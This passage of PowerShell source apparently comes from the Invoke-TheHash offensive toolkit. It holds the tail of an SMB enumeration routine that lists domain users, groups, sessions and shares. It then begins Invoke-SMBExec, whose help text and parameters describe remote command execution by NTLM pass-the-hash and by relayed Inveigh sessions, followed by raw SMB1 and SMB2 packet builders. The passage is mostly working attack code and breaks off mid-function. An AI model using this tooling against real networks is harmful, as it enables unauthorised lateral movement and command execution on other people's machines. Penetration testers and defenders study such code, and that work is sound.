                                elseif([System.BitConverter]::ToString($client_receive[12..15]) -ne '00-00-00-00')
                                {
                                    Write-Output "[-] NetSessEnum response error 0x$([System.BitConverter]::ToString($client_receive[15..12]) -replace '-','')"
                                    $stage = 'CloseRequest'
                                }
                                else
                                {
                                    $stage = 'ParseSRVSVC'
                                }

                            }

                            'NetShareEnumAll'
                            {
                                $stage = 'ParseSRVSVC'
                            }

                            'OpenAlias'
                            {
                                $step++
                                [Byte[]]$SAMR_policy_handle = $client_receive[140..159]
                        
                                if([System.BitConverter]::ToString($client_receive[156..159]) -eq '73-00-00-c0')
                                {
                                    $stage = 'SAMRCloseRequest'
                                }
                                else
                                {
                                    $stage = 'GetMembersInAlias'
                                }

                            }

                            'OpenDomain'
                            {
                                $step++
                                [Byte[]]$SAMR_domain_handle = $client_receive[140..159]

                                if($action_stage -eq 'User')
                                {
                                    $stage = 'EnumDomainUsers'
                                }
                                else
                                {
                                    $stage = 'LookupNames'
                                }

                            }

                            'OpenGroup'
                            {
                                $step++
                                [Byte[]]$group_handle = $client_receive[140..159]
                                $stage = 'QueryGroupMember'
                            }

                            'QueryGroupMember'
                            {
                                $step++
                                [Byte[]]$RID_count_bytes = $client_receive[144..147]
                                $RID_count = [System.BitConverter]::ToInt16($RID_count_bytes,0)
                                [Byte[]]$RID_list = $client_receive[160..(159 + ($RID_count * 4))]
                                $stage = 'LookupRids'
                            }

                            'QueryInfoRequest'
                            {
                                $file_ID = $client_receive[132..147]
                                $stage = 'RPCBind'
                            }

                            'ReadRequest'
                            {
                                $stage = $stage_next
                            }

                            'RPCBind'
                            {
                                $stage = 'ReadRequest'
                            }

                            'SAMRCloseRequest'
                            {
                                $step++

                                if($step -eq 8)
                                {
                                    Write-Output "[-] $Group group not found"
                                    $stage = 'TreeDisconnect'
                                }
                                else
                                {

                                    if($step -eq 5 -and $action_stage -eq 'Group')
                                    {
                                        $LSA_domain_SID = 0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x05,0x20,0x00,0x00,0x00
                                        $SID_count = 0x01,0x00,0x00,0x00
                                    }

                                    $stage = 'OpenDomain'
                                }

                            }

                            'TreeConnect'
                            {
                                $tree_ID = $client_receive[40..43]
                                $access_mask = $null

                                if($client_receive[76] -eq 92)
                                {
                                    $tree_access_mask = 0x00,0x00,0x00,0x00
                                }
                                else
                                {
                                    $tree_access_mask = $client_receive[80..83]
                                }

                                if($share_list.Count -gt 0)
                                {

                                    if($client_receive[76] -ne 92)
                                    {

                                        ForEach($byte in $tree_access_mask)
                                        {
                                            $access_mask = [System.Convert]::ToString($byte,2).PadLeft(8,'0') + $access_mask
                                        }
                                        
                                        $response_object_list | Where-Object {$_.Share -eq $share_list[$j]} | ForEach-Object {$_."Access Mask" = $access_mask}
                                        $stage = 'TreeDisconnect'
                                    }
                                    else
                                    {
                                        $access_mask = "00000000000000000000000000000000"
                                        $response_object_list | Where-Object {$_.Share -eq $share_list[$j]} | ForEach-Object {$_."Access Mask" = $access_mask}
                                        $stage = 'TreeConnect'
                                        $j++
                                    }

                                }
                                else
                                {
                                    
                                    if($action_stage -eq 'Share' -or $action_stage -eq 'NetSession')
                                    {
                                        $named_pipe = 0x73,0x00,0x72,0x00,0x76,0x00,0x73,0x00,0x76,0x00,0x63,0x00 # srvsvc
                                    }
                                    else
                                    {
                                        $named_pipe = 0x6c,0x00,0x73,0x00,0x61,0x00,0x72,0x00,0x70,0x00,0x63,0x00 # lsarpc
                                    }

                                    $tree_IPC = $tree_ID
                                    $stage = 'CreateRequest'
                                }

                            }

                            'TreeDisconnect'
                            {

                                if($Action -eq 'All')
                                {

                                    switch ($action_stage) 
                                    {

                                        'group'
                                        {

                                            if($RPC_access_denied)
                                            {
                                                $action_stage = "share"
                                            }
                                            else
                                            {
                                                $action_stage = "user"
                                                $step = 0
                                            }

                                            $stage = "TreeConnect"
                                        }

                                        'user'
                                        {
                                            $action_stage = "NetSession"
                                            $stage = "TreeConnect"
                                            
                                        }

                                        'netsession'
                                        {
                                            $action_stage = "share"
                                            $stage = "TreeConnect"
                                        }

                                        'share'
                                        {

                                            if($share_list.Count -gt 0 -and $j -lt $share_list.Count - 1)
                                            {
                                                $stage = 'TreeConnect'
                                                $j++
                                            }
                                            elseif($share_list.Count -gt 0 -and $j -eq $share_list.Count - 1)
                                            {
                                                Write-Output $response_object_list | Sort-Object -property Share |Format-Table -AutoSize
                                                $tree_ID = $tree_IPC
                                                $stage = 'TreeDisconnect'
                                                $j++
                                            }
                                            else
                                            {
                                                
                                                if($inveigh_session -and !$Logoff)
                                                {
                                                    $stage = 'Exit'
                                                }
                                                else
                                                {
                                                    $stage = 'Logoff'
                                                }

                                            }
                                            
                                        }

                                    }

                                }
                                else
                                {
                                    
                                    if($action_stage -eq 'Share' -and $share_list.Count -gt 0 -and $j -lt $share_list.Count - 1)
                                    {
                                        $stage = 'TreeConnect'
                                        $j++
                                    }
                                    elseif($action_stage -eq 'Share' -and $share_list.Count -gt 0 -and $j -eq $share_list.Count - 1)
                                    {

                                        if($TargetShow)
                                        {
                                            Write-Output "$Target Shares:"
                                        }

                                        Write-Output $response_object_list | Sort-Object -property Share |Format-Table -AutoSize
                                        $tree_ID = $tree_IPC
                                        $stage = 'TreeDisconnect'
                                        $j++
                                    }
                                    else
                                    {
                                    
                                        if($inveigh_session -and !$Logoff)
                                        {
                                            $stage = 'Exit'
                                        }
                                        else
                                        {
                                            $stage = 'Logoff'
                                        }

                                    }

                                }
                                
                            }

                        }

                    }

                    'TreeConnect'
                    {
                        $message_ID++
                        $stage_current = $stage

                        if($share_list.Count -gt 0)
                        {
                            $path = "\\" + $Target + "\" + $share_list[$j]
                            $path_bytes = [System.Text.Encoding]::Unicode.GetBytes($path)
                        }

                        $packet_SMB_header = New-PacketSMB2Header 0x03,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB_data = New-PacketSMB2TreeConnectRequest $path_bytes
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data    
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data 
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data

                        try
                        {
                            $client_stream.Write($client_send,0,$client_send.Length) > $null
                            $client_stream.Flush()
                            $client_stream.Read($client_receive,0,$client_receive.Length) > $null

                            if(Get-StatusPending $client_receive[12..15])
                            {
                                $stage = 'StatusPending'
                            }
                            else
                            {
                                $stage = 'StatusReceived'
                            }

                        }
                        catch
                        {
                            Write-Output "[-] Session connection is closed"
                            $stage = 'Exit'
                        }
                        
                    }

                    'TreeDisconnect'
                    {
                        $message_ID++
                        $stage_current = $stage
                        $packet_SMB_header = New-PacketSMB2Header 0x04,0x00 0x01,0x00 $SMB_signing $message_ID $process_ID $tree_ID $session_ID
                        $packet_SMB_data = New-PacketSMB2TreeDisconnectRequest
                        $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        $SMB_data = ConvertFrom-PacketOrderedDictionary $packet_SMB_data
                        $packet_NetBIOS_session_service = New-PacketNetBIOSSessionService $SMB_header.Length $SMB_data.Length
                        $NetBIOS_session_service = ConvertFrom-PacketOrderedDictionary $packet_NetBIOS_session_service

                        if($SMB_signing)
                        {
                            $SMB_sign = $SMB_header + $SMB_data
                            $SMB_signature = $HMAC_SHA256.ComputeHash($SMB_sign)
                            $SMB_signature = $SMB_signature[0..15]
                            $packet_SMB_header["Signature"] = $SMB_signature
                            $SMB_header = ConvertFrom-PacketOrderedDictionary $packet_SMB_header
                        }

                        $client_send = $NetBIOS_session_service + $SMB_header + $SMB_data
                        $stage = 'SendReceive'
                    }

                }
        
            }
            catch
            {
                Write-Output "[-] $($_.Exception.Message)"
            }

        }

    }

    if($inveigh_session -and $Inveigh)
    {
        $inveigh.session_lock_table[$session] = 'open'
        $inveigh.session_message_ID_table[$session] = $message_ID
        $inveigh.session[$session] | Where-Object {$_."Last Activity" = Get-Date -format s}
    }

    if(!$inveigh_session -or $Logoff)
    {
        $client.Close()
        $client_stream.Close()
    }

}

}





function Invoke-SMBExec
{
<#
.SYNOPSIS
Invoke-SMBExec performs SMBExec style command execution with NTLMv2 pass the hash authentication. Invoke-SMBExec
supports SMB1 and SMB2.1 with and without SMB signing.

Author: Kevin Robertson (@kevin_robertson)
License: BSD 3-Clause

.PARAMETER Target
Hostname or IP address of target.

.PARAMETER Username
Username to use for authentication.

.PARAMETER Domain
Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after the
username.

.PARAMETER Hash
NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.

.PARAMETER Command
Command to execute on the target. If a command is not specified, the function will check to see if the username
and hash provides local administrator access on the target.

.PARAMETER CommandCOMSPEC
Default = Enabled: Prepend %COMSPEC% /C to Command.

.PARAMETER Service
Default = 20 Character Random: Name of the service to create and delete on the target.

.PARAMETER Sleep
Default = 150 Milliseconds: Sets the function's Start-Sleep values in milliseconds. You can try tweaking this
setting if you are experiencing strange results.

.PARAMETER Session
Inveigh-Relay authenticated session.

.PARAMETER Version
Default = Auto: (Auto,1,2.1) Force SMB version. The default behavior is to perform SMB version negotiation and use SMB2.1 if supported by the
target.

.EXAMPLE
Execute a command.
Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "command or launcher to execute" -verbose

.EXAMPLE
Check command execution privilege.
Invoke-SMBExec -Target 192.168.100.20 -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0

.EXAMPLE
Execute a command using an authenticated Inveigh-Relay session.
Invoke-SMBExec -Session 1 -Command "command or launcher to execute"

.EXAMPLE
Check if SMB signing is required.
Invoke-SMBExec -Target 192.168.100.20

.LINK
https://github.com/Kevin-Robertson/Invoke-TheHash

#>
[CmdletBinding(DefaultParametersetName='Default')]
param
(
    [parameter(Mandatory=$false)][String]$Target,
    [parameter(ParameterSetName='Auth',Mandatory=$true)][String]$Username,
    [parameter(ParameterSetName='Auth',Mandatory=$false)][String]$Domain,
    [parameter(Mandatory=$false)][String]$Command,
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$CommandCOMSPEC="Y",
    [parameter(ParameterSetName='Auth',Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,
    [parameter(Mandatory=$false)][String]$Service,
    [parameter(Mandatory=$false)][ValidateSet("Auto","1","2.1")][String]$Version="Auto",
    [parameter(ParameterSetName='Session',Mandatory=$false)][Int]$Session,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Logoff,
    [parameter(ParameterSetName='Session',Mandatory=$false)][Switch]$Refresh,
    [parameter(Mandatory=$false)][Int]$Sleep=150
)

if($PsCmdlet.ParameterSetName -ne 'Session' -and !$Target)
{
    Write-Output "[-] Target is required when not using -Session"
    throw
}

if($Command)
{
    $SMB_execute = $true
}

if($Version -eq '1')
{
    $SMB_version = 'SMB1'
}
elseif($Version -eq '2.1')
{
    $SMB_version = 'SMB2.1'
}

if($PsCmdlet.ParameterSetName -ne 'Auth' -and $PsCmdlet.ParameterSetName -ne 'Session')
{
    $signing_check = $true
}

function ConvertFrom-PacketOrderedDictionary
{
    param($OrderedDictionary)

    ForEach($field in $OrderedDictionary.Values)
    {
        $byte_array += $field
    }

    return $byte_array
}

#NetBIOS

function New-PacketNetBIOSSessionService
{
    param([Int]$HeaderLength,[Int]$DataLength)

    [Byte[]]$length = ([System.BitConverter]::GetBytes($HeaderLength + $DataLength))[2..0]

    $NetBIOSSessionService = New-Object System.Collections.Specialized.OrderedDictionary
    $NetBIOSSessionService.Add("MessageType",[Byte[]](0x00))
    $NetBIOSSessionService.Add("Length",$length)

    return $NetBIOSSessionService
}

#SMB1

function New-PacketSMBHeader
{
    param([Byte[]]$Command,[Byte[]]$Flags,[Byte[]]$Flags2,[Byte[]]$TreeID,[Byte[]]$ProcessID,[Byte[]]$UserID)

    $ProcessID = $ProcessID[0,1]

    $SMBHeader = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBHeader.Add("Protocol",[Byte[]](0xff,0x53,0x4d,0x42))
    $SMBHeader.Add("Command",$Command)
    $SMBHeader.Add("ErrorClass",[Byte[]](0x00))
    $SMBHeader.Add("Reserved",[Byte[]](0x00))
    $SMBHeader.Add("ErrorCode",[Byte[]](0x00,0x00))
    $SMBHeader.Add("Flags",$Flags)
    $SMBHeader.Add("Flags2",$Flags2)
    $SMBHeader.Add("ProcessIDHigh",[Byte[]](0x00,0x00))
    $SMBHeader.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMBHeader.Add("Reserved2",[Byte[]](0x00,0x00))
    $SMBHeader.Add("TreeID",$TreeID)
    $SMBHeader.Add("ProcessID",$ProcessID)
    $SMBHeader.Add("UserID",$UserID)
    $SMBHeader.Add("MultiplexID",[Byte[]](0x00,0x00))

    return $SMBHeader
}
function New-PacketSMBNegotiateProtocolRequest
{
    param([String]$Version)

    if($Version -eq 'SMB1')
    {
        [Byte[]]$byte_count = 0x0c,0x00
    }
    else
    {
        [Byte[]]$byte_count = 0x22,0x00  
    }

    $SMBNegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBNegotiateProtocolRequest.Add("WordCount",[Byte[]](0x00))
    $SMBNegotiateProtocolRequest.Add("ByteCount",$byte_count)
    $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat",[Byte[]](0x02))
    $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name",[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))

    if($version -ne 'SMB1')
    {
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat2",[Byte[]](0x02))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name2",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_BufferFormat3",[Byte[]](0x02))
        $SMBNegotiateProtocolRequest.Add("RequestedDialects_Dialect_Name3",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
    }

    return $SMBNegotiateProtocolRequest
}

function New-PacketSMBSessionSetupAndXRequest
{
    param([Byte[]]$SecurityBlob)

    [Byte[]]$byte_count = [System.BitConverter]::GetBytes($SecurityBlob.Length)[0,1]
    [Byte[]]$security_blob_length = [System.BitConverter]::GetBytes($SecurityBlob.Length + 5)[0,1]

    $SMBSessionSetupAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBSessionSetupAndXRequest.Add("WordCount",[Byte[]](0x0c))
    $SMBSessionSetupAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBSessionSetupAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBSessionSetupAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("MaxBuffer",[Byte[]](0xff,0xff))
    $SMBSessionSetupAndXRequest.Add("MaxMpxCount",[Byte[]](0x02,0x00))
    $SMBSessionSetupAndXRequest.Add("VCNumber",[Byte[]](0x01,0x00))
    $SMBSessionSetupAndXRequest.Add("SessionKey",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("SecurityBlobLength",$byte_count)
    $SMBSessionSetupAndXRequest.Add("Reserved2",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("Capabilities",[Byte[]](0x44,0x00,0x00,0x80))
    $SMBSessionSetupAndXRequest.Add("ByteCount",$security_blob_length)
    $SMBSessionSetupAndXRequest.Add("SecurityBlob",$SecurityBlob)
    $SMBSessionSetupAndXRequest.Add("NativeOS",[Byte[]](0x00,0x00,0x00))
    $SMBSessionSetupAndXRequest.Add("NativeLANManage",[Byte[]](0x00,0x00))

    return $SMBSessionSetupAndXRequest 
}

function New-PacketSMBTreeConnectAndXRequest
{
    param([Byte[]]$Path)

    [Byte[]]$path_length = $([System.BitConverter]::GetBytes($Path.Length + 7))[0,1]

    $SMBTreeConnectAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBTreeConnectAndXRequest.Add("WordCount",[Byte[]](0x04))
    $SMBTreeConnectAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBTreeConnectAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBTreeConnectAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBTreeConnectAndXRequest.Add("Flags",[Byte[]](0x00,0x00))
    $SMBTreeConnectAndXRequest.Add("PasswordLength",[Byte[]](0x01,0x00))
    $SMBTreeConnectAndXRequest.Add("ByteCount",$path_length)
    $SMBTreeConnectAndXRequest.Add("Password",[Byte[]](0x00))
    $SMBTreeConnectAndXRequest.Add("Tree",$Path)
    $SMBTreeConnectAndXRequest.Add("Service",[Byte[]](0x3f,0x3f,0x3f,0x3f,0x3f,0x00))

    return $SMBTreeConnectAndXRequest
}

function New-PacketSMBNTCreateAndXRequest
{
    param([Byte[]]$NamedPipe)

    [Byte[]]$named_pipe_length = $([System.BitConverter]::GetBytes($NamedPipe.Length))[0,1]
    [Byte[]]$file_name_length = $([System.BitConverter]::GetBytes($NamedPipe.Length - 1))[0,1]

    $SMBNTCreateAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBNTCreateAndXRequest.Add("WordCount",[Byte[]](0x18))
    $SMBNTCreateAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBNTCreateAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBNTCreateAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBNTCreateAndXRequest.Add("Reserved2",[Byte[]](0x00))
    $SMBNTCreateAndXRequest.Add("FileNameLen",$file_name_length)
    $SMBNTCreateAndXRequest.Add("CreateFlags",[Byte[]](0x16,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("RootFID",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("AccessMask",[Byte[]](0x00,0x00,0x00,0x02))
    $SMBNTCreateAndXRequest.Add("AllocationSize",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("FileAttributes",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("ShareAccess",[Byte[]](0x07,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("Disposition",[Byte[]](0x01,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("CreateOptions",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
    $SMBNTCreateAndXRequest.Add("SecurityFlags",[Byte[]](0x00))
    $SMBNTCreateAndXRequest.Add("ByteCount",$named_pipe_length)
    $SMBNTCreateAndXRequest.Add("Filename",$NamedPipe)

    return $SMBNTCreateAndXRequest
}

function New-PacketSMBReadAndXRequest
{
    $SMBReadAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBReadAndXRequest.Add("WordCount",[Byte[]](0x0a))
    $SMBReadAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBReadAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBReadAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBReadAndXRequest.Add("FID",[Byte[]](0x00,0x40))
    $SMBReadAndXRequest.Add("Offset",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBReadAndXRequest.Add("MaxCountLow",[Byte[]](0x58,0x02))
    $SMBReadAndXRequest.Add("MinCount",[Byte[]](0x58,0x02))
    $SMBReadAndXRequest.Add("Unknown",[Byte[]](0xff,0xff,0xff,0xff))
    $SMBReadAndXRequest.Add("Remaining",[Byte[]](0x00,0x00))
    $SMBReadAndXRequest.Add("ByteCount",[Byte[]](0x00,0x00))

    return $SMBReadAndXRequest
}

function New-PacketSMBWriteAndXRequest
{
    param([Byte[]]$FileID,[Int]$Length)

    [Byte[]]$write_length = [System.BitConverter]::GetBytes($Length)[0,1]

    $SMBWriteAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBWriteAndXRequest.Add("WordCount",[Byte[]](0x0e))
    $SMBWriteAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBWriteAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBWriteAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBWriteAndXRequest.Add("FID",$FileID)
    $SMBWriteAndXRequest.Add("Offset",[Byte[]](0xea,0x03,0x00,0x00))
    $SMBWriteAndXRequest.Add("Reserved2",[Byte[]](0xff,0xff,0xff,0xff))
    $SMBWriteAndXRequest.Add("WriteMode",[Byte[]](0x08,0x00))
    $SMBWriteAndXRequest.Add("Remaining",$write_length)
    $SMBWriteAndXRequest.Add("DataLengthHigh",[Byte[]](0x00,0x00))
    $SMBWriteAndXRequest.Add("DataLengthLow",$write_length)
    $SMBWriteAndXRequest.Add("DataOffset",[Byte[]](0x3f,0x00))
    $SMBWriteAndXRequest.Add("HighOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $SMBWriteAndXRequest.Add("ByteCount",$write_length)

    return $SMBWriteAndXRequest
}

function New-PacketSMBCloseRequest
{
    param ([Byte[]]$FileID)

    $SMBCloseRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBCloseRequest.Add("WordCount",[Byte[]](0x03))
    $SMBCloseRequest.Add("FID",$FileID)
    $SMBCloseRequest.Add("LastWrite",[Byte[]](0xff,0xff,0xff,0xff))
    $SMBCloseRequest.Add("ByteCount",[Byte[]](0x00,0x00))

    return $SMBCloseRequest
}

function New-PacketSMBTreeDisconnectRequest
{
    $SMBTreeDisconnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBTreeDisconnectRequest.Add("WordCount",[Byte[]](0x00))
    $SMBTreeDisconnectRequest.Add("ByteCount",[Byte[]](0x00,0x00))

    return $SMBTreeDisconnectRequest
}

function New-PacketSMBLogoffAndXRequest
{
    $SMBLogoffAndXRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMBLogoffAndXRequest.Add("WordCount",[Byte[]](0x02))
    $SMBLogoffAndXRequest.Add("AndXCommand",[Byte[]](0xff))
    $SMBLogoffAndXRequest.Add("Reserved",[Byte[]](0x00))
    $SMBLogoffAndXRequest.Add("AndXOffset",[Byte[]](0x00,0x00))
    $SMBLogoffAndXRequest.Add("ByteCount",[Byte[]](0x00,0x00))

    return $SMBLogoffAndXRequest
}

#SMB2

function New-PacketSMB2Header
{
    param([Byte[]]$Command,[Byte[]]$CreditRequest,[Bool]$Signing,[Int]$MessageID,[Byte[]]$ProcessID,[Byte[]]$TreeID,[Byte[]]$SessionID)

    if($Signing)
    {
        $flags = 0x08,0x00,0x00,0x00      
    }
    else
    {
        $flags = 0x00,0x00,0x00,0x00
    }

    [Byte[]]$message_ID = [System.BitConverter]::GetBytes($MessageID)

    if($message_ID.Length -eq 4)
    {
        $message_ID += 0x00,0x00,0x00,0x00
    }

    $SMB2Header = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2Header.Add("ProtocolID",[Byte[]](0xfe,0x53,0x4d,0x42))
    $SMB2Header.Add("StructureSize",[Byte[]](0x40,0x00))
    $SMB2Header.Add("CreditCharge",[Byte[]](0x01,0x00))
    $SMB2Header.Add("ChannelSequence",[Byte[]](0x00,0x00))
    $SMB2Header.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2Header.Add("Command",$Command)
    $SMB2Header.Add("CreditRequest",$CreditRequest)
    $SMB2Header.Add("Flags",$flags)
    $SMB2Header.Add("NextCommand",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2Header.Add("MessageID",$message_ID)
    $SMB2Header.Add("ProcessID",$ProcessID)
    $SMB2Header.Add("TreeID",$TreeID)
    $SMB2Header.Add("SessionID",$SessionID)
    $SMB2Header.Add("Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    return $SMB2Header
}

function New-PacketSMB2NegotiateProtocolRequest
{
    $SMB2NegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2NegotiateProtocolRequest.Add("StructureSize",[Byte[]](0x24,0x00))
    $SMB2NegotiateProtocolRequest.Add("DialectCount",[Byte[]](0x02,0x00))
    $SMB2NegotiateProtocolRequest.Add("SecurityMode",[Byte[]](0x01,0x00))
    $SMB2NegotiateProtocolRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("Capabilities",[Byte[]](0x40,0x00,0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("ClientGUID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("NegotiateContextOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("NegotiateContextCount",[Byte[]](0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("Reserved2",[Byte[]](0x00,0x00))
    $SMB2NegotiateProtocolRequest.Add("Dialect",[Byte[]](0x02,0x02))
    $SMB2NegotiateProtocolRequest.Add("Dialect2",[Byte[]](0x10,0x02))

    return $SMB2NegotiateProtocolRequest
}

function New-PacketSMB2SessionSetupRequest
{
    param([Byte[]]$SecurityBlob)

    [Byte[]]$security_buffer_length = ([System.BitConverter]::GetBytes($SecurityBlob.Length))[0,1]

    $SMB2SessionSetupRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2SessionSetupRequest.Add("StructureSize",[Byte[]](0x19,0x00))
    $SMB2SessionSetupRequest.Add("Flags",[Byte[]](0x00))
    $SMB2SessionSetupRequest.Add("SecurityMode",[Byte[]](0x01))
    $SMB2SessionSetupRequest.Add("Capabilities",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2SessionSetupRequest.Add("Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2SessionSetupRequest.Add("SecurityBufferOffset",[Byte[]](0x58,0x00))
    $SMB2SessionSetupRequest.Add("SecurityBufferLength",$security_buffer_length)
    $SMB2SessionSetupRequest.Add("PreviousSessionID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2SessionSetupRequest.Add("Buffer",$SecurityBlob)

    return $SMB2SessionSetupRequest 
}

function New-PacketSMB2TreeConnectRequest
{
    param([Byte[]]$Buffer)

    [Byte[]]$path_length = ([System.BitConverter]::GetBytes($Buffer.Length))[0,1]

    $SMB2TreeConnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2TreeConnectRequest.Add("StructureSize",[Byte[]](0x09,0x00))
    $SMB2TreeConnectRequest.Add("Reserved",[Byte[]](0x00,0x00))
    $SMB2TreeConnectRequest.Add("PathOffset",[Byte[]](0x48,0x00))
    $SMB2TreeConnectRequest.Add("PathLength",$path_length)
    $SMB2TreeConnectRequest.Add("Buffer",$Buffer)

    return $SMB2TreeConnectRequest
}

function New-PacketSMB2CreateRequestFile
{
    param([Byte[]]$NamedPipe)

    $name_length = ([System.BitConverter]::GetBytes($NamedPipe.Length))[0,1]

    $SMB2CreateRequestFile = New-Object System.Collections.Specialized.OrderedDictionary
    $SMB2CreateRequestFile.Add("StructureSize",[Byte[]](0x39,0x00))
    $SMB2CreateRequestFile.Add("Flags",[Byte[]](0x00))
    $SMB2CreateRequestFile.Add("RequestedOplockLevel",[Byte[]](0x00))
    $SMB2CreateRequestFile.Add("Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("SMBCreateFlags",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("Reserved",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("DesiredAccess",[Byte[]](0x03,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("FileAttributes",[Byte[]](0x80,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("ShareAccess",[Byte[]](0x01,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("CreateDisposition",[Byte[]](0x01,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("CreateOptions",[Byte[]](0x40,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("NameOffset",[Byte[]](0x78,0x00))
    $SMB2CreateRequestFile.Add("NameLength",$name_length)
    $SMB2CreateRequestFile.Add("CreateContextsOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("CreateContextsLength",[Byte[]](0x00,0x00,0x00,0x00))
    $SMB2CreateRequestFile.Add("Buffer",$NamedPipe)

    return $SMB2CreateRequestFile
}

function New-PacketSMB2ReadRequest
{
